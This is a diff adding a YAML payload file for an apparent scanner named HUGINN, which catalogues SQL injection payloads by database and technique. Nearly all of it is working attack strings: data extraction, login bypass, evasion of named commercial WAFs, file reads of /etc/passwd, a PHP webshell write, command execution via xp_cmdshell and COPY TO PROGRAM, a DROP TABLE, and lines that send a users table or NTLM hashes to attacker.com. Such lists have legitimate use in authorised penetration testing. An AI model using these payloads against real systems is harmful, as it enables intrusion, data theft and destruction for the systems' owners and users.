@@ -1,0 +1,1120 @@
+# =============================================================================
+#  HUGINN :: payloads/sqli.yaml
+#  Comprehensive SQL Injection Payload Arsenal
+# -----------------------------------------------------------------------------
+#  Categories:
+#    - basic_detection        : sanity checks that a parameter is injectable
+#    - error_based            : provoke DB error messages for extraction
+#    - union_based            : UNION SELECT data retrieval
+#    - blind_boolean          : true/false response inference
+#    - blind_time             : time-delay inference
+#    - stacked_queries        : multiple statements in one transaction
+#    - auth_bypass            : login / privilege-escalation payloads
+#    - waf_bypass             : encoding, comments, case, obfuscation
+#    - dbms_specific          : MySQL / PostgreSQL / MSSQL / Oracle / SQLite
+#    - nosql                  : MongoDB / Redis / CouchDB / Cassandra
+#    - cloud_specific         : AWS RDS / Azure SQL / GCP Cloud SQL
+#    - legacy                 : 1990s-era syntax, still occasionally live
+#    - modern_bypass          : 2025/2026 JSON-chaining & protocol tricks
+#
+#  This file is a living document. Every payload carries metadata so the
+#  scanner can route by target technology and WAF fingerprint.
+# =============================================================================
+
+meta:
+  name: "HUGINN SQLi Arsenal"
+  version: "2.0.0"
+  description: >
+    Comprehensive SQL injection payload set spanning classic 1990s syntax
+    through modern 2025/2026 WAF-bypass techniques. Covers MySQL, PostgreSQL,
+    MSSQL, Oracle, SQLite, MongoDB, Redis, CouchDB, Cassandra, and cloud-managed
+    database services (AWS RDS, Azure SQL, GCP Cloud SQL).
+  references:
+    - "https://github.com/swisskyrepo/PayloadsAllTheThings"
+    - "https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet"
+    - "https://www.invicti.com/blog/web-security/nosql-injection-cheat-sheet"
+    - "https://hacktricks.wiki/en/pentesting-web/sql-injection/"
+    - "https://github.com/regaan/sqlmap-tamper-collection"
+    - "https://github.com/PAPAMICA/waf-checker"
+  last_updated: "2026-09-10"
+
+# =============================================================================
+#  PAYLOAD LIST
+# =============================================================================
+payloads:
+
+  # ---------------------------------------------------------------------------
+  #  1. BASIC DETECTION
+  #     Send these first. Any behavioural change (error, timing, content)
+  #     indicates the parameter reaches the SQL layer unsanitised.
+  # ---------------------------------------------------------------------------
+  - id: "basic-001"
+    name: "Single Quote"
+    category: "basic_detection"
+    dbms: "generic"
+    payload: "'"
+    description: "Classic quote test. A DB error or unexpected 500 indicates raw SQL concatenation."
+    tags: ["detection", "classic"]
+    references: ["https://owasp.org/www-community/attacks/SQL_Injection"]
+
+  - id: "basic-002"
+    name: "Double Quote"
+    category: "basic_detection"
+    dbms: "generic"
+    payload: "\""
+    description: "Double-quote test for code paths that wrap input in double quotes."
+    tags: ["detection", "classic"]
+
+  - id: "basic-003"
+    name: "Backtick"
+    category: "basic_detection"
+    dbms: "mysql"
+    payload: "`"
+    description: "MySQL identifier quote — triggers syntax errors in MySQL/MariaDB."
+    tags: ["detection", "mysql"]
+
+  - id: "basic-004"
+    name: "Semicolon"
+    category: "basic_detection"
+    dbms: "generic"
+    payload: ";"
+    description: "Statement terminator — useful for detecting stacked-query support."
+    tags: ["detection", "stacked"]
+
+  - id: "basic-005"
+    name: "Line Comment (double dash)"
+    category: "basic_detection"
+    dbms: "all"
+    payload: "'-- "
+    description: "Comments out the rest of the query. Works on MySQL, MSSQL, PostgreSQL, Oracle, SQLite."
+    tags: ["detection", "comment"]
+
+  - id: "basic-006"
+    name: "Line Comment (hash)"
+    category: "basic_detection"
+    dbms: "mysql"
+    payload: "'#"
+    description: "MySQL-specific line comment."
+    tags: ["detection", "comment", "mysql"]
+
+  - id: "basic-007"
+    name: "Inline Comment (generic)"
+    category: "basic_detection"
+    dbms: "all"
+    payload: "/*"
+    description: "Unterminated inline comment — comments out the rest of the query on most DBMS."
+    tags: ["detection", "comment"]
+
+  - id: "basic-008"
+    name: "Parenthesis + Quote"
+    category: "basic_detection"
+    dbms: "generic"
+    payload: "')"
+    description: "Breaks out of a parenthesised expression followed by a string literal."
+    tags: ["detection", "classic"]
+
+  - id: "basic-009"
+    name: "Parenthesis + Double Quote"
+    category: "basic_detection"
+    dbms: "generic"
+    payload: "\")"
+    description: "Breaks out of a parenthesised expression with a double-quoted string."
+    tags: ["detection", "classic"]
+
+  - id: "basic-010"
+    name: "Quote + Union probe"
+    category: "basic_detection"
+    dbms: "all"
+    payload: "' UNION SELECT NULL-- "
+    description: "Quick UNION probe with a single NULL column."
+    tags: ["detection", "union"]
+
+  # ---------------------------------------------------------------------------
+  #  2. ERROR-BASED PAYLOADS
+  #     Force the DBMS to emit its version / schema / table names in an error.
+  # ---------------------------------------------------------------------------
+  - id: "err-mysql-001"
+    name: "MySQL extractvalue"
+    category: "error_based"
+    dbms: "mysql"
+    payload: "' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))-- "
+    description: "Extracts MySQL version via XML error. Works on MySQL 5.1+."
+    tags: ["mysql", "error", "version"]
+    references: ["https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html"]
+
+  - id: "err-mysql-002"
+    name: "MySQL updatexml"
+    category: "error_based"
+    dbms: "mysql"
+    payload: "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- "
+    description: "Extracts current MySQL user via XML error."
+    tags: ["mysql", "error", "user"]
+
+  - id: "err-mysql-003"
+    name: "MySQL extractvalue (database)"
+    category: "error_based"
+    dbms: "mysql"
+    payload: "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- "
+    description: "Extracts current database name via XML error."
+    tags: ["mysql", "error", "database"]
+
+  - id: "err-mysql-004"
+    name: "MySQL FLOOR/RAND duplicate-entry"
+    category: "error_based"
+    dbms: "mysql"
+    payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- "
+    description: "Classic FLOOR(RAND(0)*2) error-based payload — leaks data via duplicate-entry error."
+    tags: ["mysql", "error", "classic"]
+    references: ["https://www.exploit-db.com/papers/14690"]
+
+  - id: "err-pg-001"
+    name: "PostgreSQL CAST error"
+    category: "error_based"
+    dbms: "postgresql"
+    payload: "' AND 1=CAST(version() AS int)-- "
+    description: "Forces a type-cast error that reveals the PostgreSQL version string."
+    tags: ["postgresql", "error", "version"]
+
+  - id: "err-pg-002"
+    name: "PostgreSQL CAST (current_user)"
+    category: "error_based"
+    dbms: "postgresql"
+    payload: "' AND 1=CAST(current_user AS int)-- "
+    description: "Leaks current database user via cast error."
+    tags: ["postgresql", "error", "user"]
+
+  - id: "err-pg-003"
+    name: "PostgreSQL regexp-based error"
+    category: "error_based"
+    dbms: "postgresql"
+    payload: "' AND 1=(SELECT 1 FROM pg_catalog.pg_tables WHERE tablename ~ '^pg_' LIMIT 1)-- "
+    description: "Uses a regex operator to provoke a data-type or pattern error in some configurations."
+    tags: ["postgresql", "error"]
+
+  - id: "err-mssql-001"
+    name: "MSSQL CONVERT int"
+    category: "error_based"
+    dbms: "mssql"
+    payload: "' AND 1=CONVERT(int,@@version)-- "
+    description: "Leaks MSSQL version via conversion error."
+    tags: ["mssql", "error", "version"]
+
+  - id: "err-mssql-002"
+    name: "MSSQL CONVERT int (user)"
+    category: "error_based"
+    dbms: "mssql"
+    payload: "' AND 1=CONVERT(int,USER_NAME())-- "
+    description: "Leaks current MSSQL user via conversion error."
+    tags: ["mssql", "error", "user"]
+
+  - id: "err-mssql-003"
+    name: "MSSQL HAVING 1=1"
+    category: "error_based"
+    dbms: "mssql"
+    payload: "' HAVING 1=1-- "
+    description: "Triggers an MSSQL error that reveals column names in the message."
+    tags: ["mssql", "error", "column-enum"]
+
+  - id: "err-mssql-004"
+    name: "MSSQL GROUP BY column enumeration"
+    category: "error_based"
+    dbms: "mssql"
+    payload: "' GROUP BY users.username HAVING 1=1-- "
+    description: "Iteratively triggers errors revealing column names."
+    tags: ["mssql", "error", "column-enum"]
+
+  - id: "err-oracle-001"
+    name: "Oracle CTXSYS.DRITHSX.SN"
+    category: "error_based"
+    dbms: "oracle"
+    payload: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- "
+    description: "Oracle error-based payload that leaks the current schema user."
+    tags: ["oracle", "error", "user"]
+    references: ["https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet"]
+
+  - id: "err-oracle-002"
+    name: "Oracle UTL_INADDR.GET_HOST_ADDRESS"
+    category: "error_based"
+    dbms: "oracle"
+    payload: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- "
+    description: "Leaks data via Oracle network function error."
+    tags: ["oracle", "error", "network"]
+
+  - id: "err-oracle-003"
+    name: "Oracle DECODE type-conversion"
+    category: "error_based"
+    dbms: "oracle"
+    payload: "' AND 1=DECODE(1,1,(SELECT user FROM dual),'a')-- "
+    description: "Uses DECODE's type-coercion behaviour to force a conversion error on a false branch."
+    tags: ["oracle", "error", "boolean"]
+    references: ["https://www.synack.com/exploits-explained/turning-blind-error-based-sql-injection-into-exploitable-boolean-one-part-4-oracle/"]
+
+  - id: "err-sqlite-001"
+    name: "SQLite CAST error"
+    category: "error_based"
+    dbms: "sqlite"
+    payload: "' AND 1=CAST(sqlite_version() AS int)-- "
+    description: "Leaks SQLite version via cast error."
+    tags: ["sqlite", "error", "version"]
+
+  - id: "err-sqlite-002"
+    name: "SQLite randomblob error"
+    category: "error_based"
+    dbms: "sqlite"
+    payload: "' AND 1=randomblob(-1)-- "
+    description: "Provokes an error via negative blob length."
+    tags: ["sqlite", "error"]
+
+  # ---------------------------------------------------------------------------
+  #  3. UNION-BASED PAYLOADS
+  #     Retrieve data directly in the application's response.
+  # ---------------------------------------------------------------------------
+  - id: "union-001"
+    name: "UNION SELECT NULL (1 column)"
+    category: "union_based"
+    dbms: "all"
+    payload: "' UNION SELECT NULL-- "
+    description: "Single-column UNION probe — start here and expand column count."
+    tags: ["union", "column-count"]
+
+  - id: "union-002"
+    name: "UNION SELECT NULL (3 columns)"
+    category: "union_based"
+    dbms: "all"
+    payload: "' UNION SELECT NULL,NULL,NULL-- "
+    description: "Three-column UNION probe."
+    tags: ["union", "column-count"]
+
+  - id: "union-003"
+    name: "UNION SELECT NULL (5 columns)"
+    category: "union_based"
+    dbms: "all"
+    payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- "
+    description: "Five-column UNION probe."
+    tags: ["union", "column-count"]
+
+  - id: "union-mysql-001"
+    name: "MySQL UNION version + database"
+    category: "union_based"
+    dbms: "mysql"
+    payload: "' UNION ALL SELECT CONCAT(0x7e,@@version,0x7e),NULL,NULL-- "
+    description: "Retrieves MySQL version and database in the first two columns."
+    tags: ["mysql", "union", "version"]
+
+  - id: "union-mysql-002"
+    name: "MySQL UNION schema enumeration"
+    category: "union_based"
+    dbms: "mysql"
+    payload: "' UNION ALL SELECT GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata-- "
+    description: "Enumerates all database schemas via GROUP_CONCAT."
+    tags: ["mysql", "union", "schema"]
+
+  - id: "union-pg-001"
+    name: "PostgreSQL UNION version"
+    category: "union_based"
+    dbms: "postgresql"
+    payload: "' UNION ALL SELECT version(),NULL,NULL-- "
+    description: "Retrieves PostgreSQL version."
+    tags: ["postgresql", "union", "version"]
+
+  - id: "union-pg-002"
+    name: "PostgreSQL UNION current_database"
+    category: "union_based"
+    dbms: "postgresql"
+    payload: "' UNION ALL SELECT current_database(),NULL,NULL-- "
+    description: "Retrieves current database name."
+    tags: ["postgresql", "union", "database"]
+
+  - id: "union-mssql-001"
+    name: "MSSQL UNION @@version"
+    category: "union_based"
+    dbms: "mssql"
+    payload: "' UNION SELECT @@version,NULL,NULL-- "
+    description: "Retrieves MSSQL version."
+    tags: ["mssql", "union", "version"]
+
+  - id: "union-mssql-002"
+    name: "MSSQL UNION DB_NAME()"
+    category: "union_based"
+    dbms: "mssql"
+    payload: "' UNION SELECT DB_NAME(),NULL,NULL-- "
+    description: "Retrieves current database name."
+    tags: ["mssql", "union", "database"]
+
+  - id: "union-oracle-001"
+    name: "Oracle UNION banner"
+    category: "union_based"
+    dbms: "oracle"
+    payload: "' UNION SELECT banner,NULL FROM v$version-- "
+    description: "Retrieves Oracle version banner from v$version."
+    tags: ["oracle", "union", "version"]
+    references: ["https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle"]
+
+  - id: "union-oracle-002"
+    name: "Oracle UNION table listing"
+    category: "union_based"
+    dbms: "oracle"
+    payload: "' UNION SELECT table_name,NULL FROM all_tables-- "
+    description: "Lists all accessible tables."
+    tags: ["oracle", "union", "schema"]
+    references: ["https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle"]
+
+  - id: "union-sqlite-001"
+    name: "SQLite UNION sqlite_version"
+    category: "union_based"
+    dbms: "sqlite"
+    payload: "' UNION ALL SELECT sqlite_version(),NULL-- "
+    description: "Retrieves SQLite version."
+    tags: ["sqlite", "union", "version"]
+
+  # ---------------------------------------------------------------------------
+  #  4. BLIND BOOLEAN PAYLOADS
+  #     Infer data from differences in page content / status / length.
+  # ---------------------------------------------------------------------------
+  - id: "bool-001"
+    name: "AND 1=1 (true)"
+    category: "blind_boolean"
+    dbms: "all"
+    payload: "' AND 1=1-- "
+    description: "True condition — baseline for response comparison."
+    tags: ["blind", "boolean", "baseline"]
+
+  - id: "bool-002"
+    name: "AND 1=2 (false)"
+    category: "blind_boolean"
+    dbms: "all"
+    payload: "' AND 1=2-- "
+    description: "False condition — compare against bool-001."
+    tags: ["blind", "boolean", "baseline"]
+
+  - id: "bool-003"
+    name: "OR 1=1"
+    category: "blind_boolean"
+    dbms: "all"
+    payload: "' OR 1=1-- "
+    description: "Universal true condition — classic auth bypass / data exfil."
+    tags: ["blind", "boolean", "auth-bypass"]
+
+  - id: "bool-004"
+    name: "AND substring (first char)"
+    category: "blind_boolean"
+    dbms: "mysql"
+    payload: "' AND (SELECT SUBSTRING(version(),1,1))='8'-- "
+    description: "Character-by-character extraction via boolean inference."
+    tags: ["blind", "boolean", "extraction", "mysql"]
+
+  - id: "bool-005"
+    name: "AND ASCII substring"
+    category: "blind_boolean"
+    dbms: "mysql"
+    payload: "' AND ASCII(SUBSTRING((SELECT user()),1,1))=114-- "
+    description: "ASCII-based boolean extraction (114 = 'r' for root)."
+    tags: ["blind", "boolean", "extraction", "mysql"]
+
+  - id: "bool-pg-001"
+    name: "PostgreSQL CASE WHEN"
+    category: "blind_boolean"
+    dbms: "postgresql"
+    payload: "' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)-- "
+    description: "PostgreSQL boolean test using CASE expression."
+    tags: ["blind", "boolean", "postgresql"]
+
+  - id: "bool-mssql-001"
+    name: "MSSQL IF ... ELSE"
+    category: "blind_boolean"
+    dbms: "mssql"
+    payload: "'; IF (1=1) SELECT 1 ELSE SELECT 1/0-- "
+    description: "MSSQL boolean via IF/ELSE divide-by-zero on false branch."
+    tags: ["blind", "boolean", "mssql"]
+
+  - id: "bool-oracle-001"
+    name: "Oracle DECODE boolean"
+    category: "blind_boolean"
+    dbms: "oracle"
+    payload: "' AND 1=DECODE(1,1,1,(SELECT 1/0 FROM dual))-- "
+    description: "Oracle boolean using DECODE with divide-by-zero on false."
+    tags: ["blind", "boolean", "oracle"]
+
+  # ---------------------------------------------------------------------------
+  #  5. BLIND TIME-BASED PAYLOADS
+  #     No content difference? Measure response time.
+  # ---------------------------------------------------------------------------
+  - id: "time-mysql-001"
+    name: "MySQL SLEEP"
+    category: "blind_time"
+    dbms: "mysql"
+    payload: "' AND SLEEP(5)-- "
+    description: "Unconditional 5-second delay."
+    tags: ["blind", "time", "mysql"]
+
+  - id: "time-mysql-002"
+    name: "MySQL SLEEP conditional"
+    category: "blind_time"
+    dbms: "mysql"
+    payload: "' AND IF(1=1,SLEEP(5),0)-- "
+    description: "Conditional delay — only sleeps when the injected condition is true."
+    tags: ["blind", "time", "mysql"]
+
+  - id: "time-mysql-003"
+    name: "MySQL BENCHMARK"
+    category: "blind_time"
+    dbms: "mysql"
+    payload: "' AND BENCHMARK(5000000,MD5('a'))-- "
+    description: "CPU-burn delay using BENCHMARK when SLEEP is filtered."
+    tags: ["blind", "time", "mysql", "waf-bypass"]
+
+  - id: "time-pg-001"
+    name: "PostgreSQL pg_sleep"
+    category: "blind_time"
+    dbms: "postgresql"
+    payload: "'; SELECT pg_sleep(5)-- "
+    description: "Unconditional 5-second delay via pg_sleep."
+    tags: ["blind", "time", "postgresql"]
+
+  - id: "time-pg-002"
+    name: "PostgreSQL pg_sleep conditional"
+    category: "blind_time"
+    dbms: "postgresql"
+    payload: "' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE pg_sleep(5)::int END)-- "
+    description: "Conditional delay using CASE and pg_sleep."
+    tags: ["blind", "time", "postgresql"]
+
+  - id: "time-mssql-001"
+    name: "MSSQL WAITFOR DELAY"
+    category: "blind_time"
+    dbms: "mssql"
+    payload: "'; WAITFOR DELAY '0:0:5'-- "
+    description: "Unconditional 5-second delay."
+    tags: ["blind", "time", "mssql"]
+
+  - id: "time-mssql-002"
+    name: "MSSQL WAITFOR conditional"
+    category: "blind_time"
+    dbms: "mssql"
+    payload: "'; IF (1=1) WAITFOR DELAY '0:0:5'-- "
+    description: "Conditional delay via IF."
+    tags: ["blind", "time", "mssql"]
+
+  - id: "time-oracle-001"
+    name: "Oracle dbms_lock.sleep"
+    category: "blind_time"
+    dbms: "oracle"
+    payload: "' AND 1=(SELECT 1 FROM dual WHERE 1=1 AND dbms_lock.sleep(5)=0)-- "
+    description: "Oracle time-based delay via dbms_lock.sleep."
+    tags: ["blind", "time", "oracle"]
+
+  - id: "time-oracle-002"
+    name: "Oracle BEGIN dbms_lock.sleep"
+    category: "blind_time"
+    dbms: "oracle"
+    payload: "' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT dbms_lock.sleep(5) FROM dual) END FROM dual)-- "
+    description: "Conditional Oracle delay using CASE."
+    tags: ["blind", "time", "oracle"]
+
+  - id: "time-sqlite-001"
+    name: "SQLite heavy query"
+    category: "blind_time"
+    dbms: "sqlite"
+    payload: "' AND 1=(SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)-- "
+    description: "SQLite has no SLEEP; use a computationally heavy cartesian query as a delay."
+    tags: ["blind", "time", "sqlite"]
+
+  # ---------------------------------------------------------------------------
+  #  6. STACKED QUERIES
+  #     Only works when the driver allows multiple statements.
+  # ---------------------------------------------------------------------------
+  - id: "stack-001"
+    name: "Stacked DROP TABLE"
+    category: "stacked_queries"
+    dbms: "mysql|mssql|postgresql"
+    payload: "'; DROP TABLE members-- "
+    description: "Classic stacked DROP — destructive, use only in authorised tests with explicit permission."
+    tags: ["stacked", "destructive"]
+
+  - id: "stack-002"
+    name: "Stacked SELECT (exfil)"
+    category: "stacked_queries"
+    dbms: "mysql|mssql"
+    payload: "'; SELECT * FROM users-- "
+    description: "Second statement result is generally not returned; pair with out-of-band or blind techniques."
+    tags: ["stacked", "exfil"]
+
+  - id: "stack-003"
+    name: "MSSQL stacked xp_cmdshell probe"
+    category: "stacked_queries"
+    dbms: "mssql"
+    payload: "'; EXEC xp_cmdshell 'whoami'-- "
+    description: "MSSQL command execution probe — only if xp_cmdshell is enabled."
+    tags: ["stacked", "rce", "mssql"]
+
+  - id: "stack-004"
+    name: "PostgreSQL COPY TO PROGRAM"
+    category: "stacked_queries"
+    dbms: "postgresql"
+    payload: "'; COPY (SELECT '') TO PROGRAM 'id'-- "
+    description: "PostgreSQL RCE via COPY TO PROGRAM (requires superuser or pg_execute_server_program)."
+    tags: ["stacked", "rce", "postgresql"]
+
+  # ---------------------------------------------------------------------------
+  #  7. AUTHENTICATION BYPASS
+  # ---------------------------------------------------------------------------
+  - id: "auth-001"
+    name: "Classic OR 1=1"
+    category: "auth_bypass"
+    dbms: "all"
+    payload: "' OR '1'='1"
+    description: "Classic login bypass — username field."
+    tags: ["auth-bypass", "classic"]
+
+  - id: "auth-002"
+    name: "Admin comment-out"
+    category: "auth_bypass"
+    dbms: "all"
+    payload: "admin'-- "
+    description: "Log in as admin by commenting out the password check."
+    tags: ["auth-bypass", "classic"]
+
+  - id: "auth-003"
+    name: "OR 1=1 with comment"
+    category: "auth_bypass"
+    dbms: "all"
+    payload: "' OR 1=1-- "
+    description: "Universal bypass with comment terminator."
+    tags: ["auth-bypass", "classic"]
+
+  - id: "auth-004"
+    name: "MySQL hash bypass"
+    category: "auth_bypass"
+    dbms: "mysql"
+    payload: "admin' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055'-- "
+    description: "Bypass MD5 hash check by supplying a known hash (81dc9... = MD5('1234'))."
+    tags: ["auth-bypass", "mysql", "hash"]
+    references: ["https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet"]
+
+  - id: "auth-005"
+    name: "SQLite auth bypass"
+    category: "auth_bypass"
+    dbms: "sqlite"
+    payload: "' OR 1=1-- "
+    description: "SQLite login bypass."
+    tags: ["auth-bypass", "sqlite"]
+
+  # ---------------------------------------------------------------------------
+  #  8. WAF BYPASS PAYLOADS
+  #     Designed to evade keyword filters, regex WAFs, and signature engines.
+  # ---------------------------------------------------------------------------
+  - id: "waf-001"
+    name: "MySQL version comment (SELECT)"
+    category: "waf_bypass"
+    dbms: "mysql"
+    payload: "/*!50000SELECT*/ * FROM users"
+    description: "MySQL executable comment — WAFs that strip comments may pass this through."
+    tags: ["waf-bypass", "mysql", "comment"]
+
+  - id: "waf-002"
+    name: "MySQL version comment (UNION)"
+    category: "waf_bypass"
+    dbms: "mysql"
+    payload: "/*!50000UNION*//*!50000SELECT*/ 1,2,3-- "
+    description: "Version-comment wrapping around UNION SELECT."
+    tags: ["waf-bypass", "mysql", "comment"]
+
+  - id: "waf-003"
+    name: "Space-to-comment"
+    category: "waf_bypass"
+    dbms: "all"
+    payload: "SELECT/**/password/**/FROM/**/Members"
+    description: "Replace spaces with /**/ to evade space-detection rules."
+    tags: ["waf-bypass", "comment", "obfuscation"]
+    references: ["https://github.com/regaan/sqlmap-tamper-collection"]
+
+  - id: "waf-004"
+    name: "Alternating case"
+    category: "waf_bypass"
+    dbms: "all"
+    payload: "sElEcT * fRoM uSeRs"
+    description: "Alternating case defeats case-sensitive keyword signatures."
+    tags: ["waf-bypass", "case"]
+    references: ["https://github.com/regaan/sqlmap-tamper-collection"]
+
+  - id: "waf-005"
+    name: "URL-encoded quote"
+    category: "waf_bypass"
+    dbms: "all"
+    payload: "%27%20OR%201%3D1--%20"
+    description: "URL-encoded OR 1=1 — bypasses naive decoding WAFs."
+    tags: ["waf-bypass", "encoding", "url"]
+
+  - id: "waf-006"
+    name: "Double URL-encoded quote"
+    category: "waf_bypass"
+    dbms: "all"
+    payload: "%2527%2520OR%25201%253D1--%2520"
+    description: "Double-encoded — bypasses WAFs that decode once but not twice."
+    tags: ["waf-bypass", "encoding", "double-url"]
+
+  - id: "waf-007"
+    name: "Hex-encoded string"
+    category: "waf_bypass"
+    dbms: "mysql|postgresql"
+    payload: "' AND 1=0x31-- "
+    description: "Use hex literals instead of quoted strings to evade quote filters."
+    tags: ["waf-bypass", "encoding", "hex"]
+
+  - id: "waf-008"
+    name: "MySQL comment chaos"
+    category: "waf_bypass"
+    dbms: "mysql"
+    payload: "/*!50000SELECT*//**/1/**/,/**/2/**/,/**/3/**/-- "
+    description: "Mixed executable and generic comments to break up signatures."
+    tags: ["waf-bypass", "mysql", "comment"]
+
+  - id: "waf-009"
+    name: "Cloudflare 2025 bypass"
+    category: "waf_bypass"
+    dbms: "mysql"
+    waf: "cloudflare"
+    payload: "/*!50000sElEcT*//**/*/**//*!50000fRoM*//**/users/**//*!50000wHeRe*//**/id%3E%3D5-- "
+    description: "Multi-layer Cloudflare bypass combining version comments, case alternation, and operator URL-encoding."
+    tags: ["waf-bypass", "cloudflare", "mysql"]
+    references: ["https://github.com/regaan/sqlmap-tamper-collection"]
+
+  - id: "waf-010"
+    name: "AWS WAF v2 bypass"
+    category: "waf_bypass"
+    dbms: "all"
+    waf: "awswaf"
+    payload: "'/**/OR/**/1=1/**/-- "
+    description: "Comment-obfuscated OR 1=1 targeting AWS WAF v2 signatures."
+    tags: ["waf-bypass", "awswaf"]
+
+  - id: "waf-011"
+    name: "Azure WAF bypass (hex strings)"
+    category: "waf_bypass"
+    dbms: "mssql"
+    waf: "azurewaf"
+    payload: "'; EXEC('SELECT 0x61646d696e')-- "
+    description: "Hex-encoded string inside EXEC to evade Azure WAF string matching."
+    tags: ["waf-bypass", "azurewaf", "mssql"]
+
+  - id: "waf-012"
+    name: "Imperva homoglyph bypass"
+    category: "waf_bypass"
+    dbms: "all"
+    waf: "imperva"
+    payload: "SELECT * FROM users WHERE id = 1 ᴏʀ 1=1-- "
+    description: "Unicode homoglyph replacement of OR to evade Imperva signature matching."
+    tags: ["waf-bypass", "imperva", "unicode"]
+    references: ["https://github.com/regaan/sqlmap-tamper-collection"]
+
+  - id: "waf-013"
+    name: "Comment between every keyword"
+    category: "waf_bypass"
+    dbms: "all"
+    payload: "SEL/**/ECT/**/ * FR/**/OM/**/ users"
+    description: "Break every keyword in half with a comment."
+    tags: ["waf-bypass", "comment", "obfuscation"]
+
+  - id: "waf-014"
+    name: "MySQL scientific notation"
+    category: "waf_bypass"
+    dbms: "mysql"
+    payload: "' AND 1=1e0-- "
+    description: "Scientific notation for 1 — bypasses numeric-literal regexes."
+    tags: ["waf-bypass", "mysql", "numeric"]
+
+  - id: "waf-015"
+    name: "MySQL backtick identifier"
+    category: "waf_bypass"
+    dbms: "mysql"
+    payload: "`users`.`password`"
+    description: "Backtick-quoted identifiers can break signature-based column-name detection."
+    tags: ["waf-bypass", "mysql", "identifier"]
+
+  # ---------------------------------------------------------------------------
+  #  9. DATABASE-SPECIFIC EXTENDED PAYLOADS
+  # ---------------------------------------------------------------------------
+  - id: "dbms-mysql-001"
+    name: "MySQL information_schema enumeration"
+    category: "dbms_specific"
+    dbms: "mysql"
+    payload: "' UNION ALL SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- "
+    description: "Lists all tables in the current database."
+    tags: ["mysql", "enumeration"]
+
+  - id: "dbms-mysql-002"
+    name: "MySQL column enumeration"
+    category: "dbms_specific"
+    dbms: "mysql"
+    payload: "' UNION ALL SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- "
+    description: "Lists columns of the 'users' table."
+    tags: ["mysql", "enumeration"]
+
+  - id: "dbms-mysql-003"
+    name: "MySQL file read"
+    category: "dbms_specific"
+    dbms: "mysql"
+    payload: "' UNION ALL SELECT LOAD_FILE('/etc/passwd'),NULL-- "
+    description: "Read files via LOAD_FILE (requires FILE privilege + secure_file_priv)."
+    tags: ["mysql", "file-read", "rce-adjacent"]
+
+  - id: "dbms-mysql-004"
+    name: "MySQL file write"
+    category: "dbms_specific"
+    dbms: "mysql"
+    payload: "' UNION ALL SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- "
+    description: "Write a webshell via INTO OUTFILE (requires FILE privilege + writable dir)."
+    tags: ["mysql", "file-write", "rce"]
+
+  - id: "dbms-pg-001"
+    name: "PostgreSQL table enumeration"
+    category: "dbms_specific"
+    dbms: "postgresql"
+    payload: "' UNION ALL SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- "
+    description: "Lists all public tables."
+    tags: ["postgresql", "enumeration"]
+
+  - id: "dbms-pg-002"
+    name: "PostgreSQL column enumeration"
+    category: "dbms_specific"
+    dbms: "postgresql"
+    payload: "' UNION ALL SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- "
+    description: "Lists columns of the 'users' table."
+    tags: ["postgresql", "enumeration"]
+
+  - id: "dbms-pg-003"
+    name: "PostgreSQL large object read"
+    category: "dbms_specific"
+    dbms: "postgresql"
+    payload: "'; SELECT lo_import('/etc/passwd')-- "
+    description: "Read files via lo_import (requires superuser)."
+    tags: ["postgresql", "file-read", "rce-adjacent"]
+
+  - id: "dbms-pg-004"
+    name: "PostgreSQL COPY TO PROGRAM"
+    category: "dbms_specific"
+    dbms: "postgresql"
+    payload: "'; COPY (SELECT '') TO PROGRAM 'id'-- "
+    description: "Command execution via COPY TO PROGRAM."
+    tags: ["postgresql", "rce"]
+
+  - id: "dbms-mssql-001"
+    name: "MSSQL table enumeration"
+    category: "dbms_specific"
+    dbms: "mssql"
+    payload: "' UNION ALL SELECT name,NULL FROM sys.tables-- "
+    description: "Lists all tables via sys.tables."
+    tags: ["mssql", "enumeration"]
+
+  - id: "dbms-mssql-002"
+    name: "MSSQL column enumeration"
+    category: "dbms_specific"
+    dbms: "mssql"
+    payload: "' UNION ALL SELECT name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')-- "
+    description: "Lists columns of the 'users' table."
+    tags: ["mssql", "enumeration"]
+
+  - id: "dbms-mssql-003"
+    name: "MSSQL xp_dirtree (UNC path)"
+    category: "dbms_specific"
+    dbms: "mssql"
+    payload: "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'-- "
+    description: "Triggers an SMB request — useful for NTLM hash capture."
+    tags: ["mssql", "oob", "ntlm"]
+
+  - id: "dbms-mssql-004"
+    name: "MSSQL OPENROWSET"
+    category: "dbms_specific"
+    dbms: "mssql"
+    payload: "'; INSERT INTO OPENROWSET('SQLOLEDB','server=attacker.com;uid=a;pwd=b','SELECT * FROM foo') SELECT * FROM users-- "
+    description: "Exfiltrate data via OPENROWSET to a remote MSSQL server."
+    tags: ["mssql", "oob", "exfil"]
+
+  - id: "dbms-oracle-001"
+    name: "Oracle table enumeration"
+    category: "dbms_specific"
+    dbms: "oracle"
+    payload: "' UNION SELECT table_name,NULL FROM all_tables-- "
+    description: "Lists all accessible tables."
+    tags: ["oracle", "enumeration"]
+
